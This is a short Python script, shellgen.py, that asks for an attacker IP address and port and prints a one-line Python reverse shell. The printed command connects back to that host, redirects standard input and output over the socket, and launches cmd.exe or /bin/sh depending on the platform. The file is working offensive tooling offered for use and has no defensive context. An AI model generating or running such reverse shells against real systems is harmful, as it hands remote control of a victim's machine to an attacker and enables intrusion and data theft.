# shellgen.py - Create cross platform one liner python reverse shell scripts
def getInformation():
    attackerIP = input("Enter attacker IP: ")
    shellPort = int(input("Enter port: "))
    return attackerIP, shellPort

def generateOneLiner(attackerIP, shellPort):
    one_liner = (
        f'python -c "import socket,subprocess,os,platform;'
        f's=socket.socket();s.connect((\'{attackerIP}\',{shellPort}));'
        f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
        f'subprocess.call([\'cmd.exe\'] if platform.system()==\'Windows\' else [\'/bin/sh\'])"'
    )
    print("\n[*] Python reverse shell:\n")
    print(one_liner)


if __name__ == "__main__":
    attackerIP, shellPort = getInformation()
    generateOneLiner(attackerIP, shellPort)
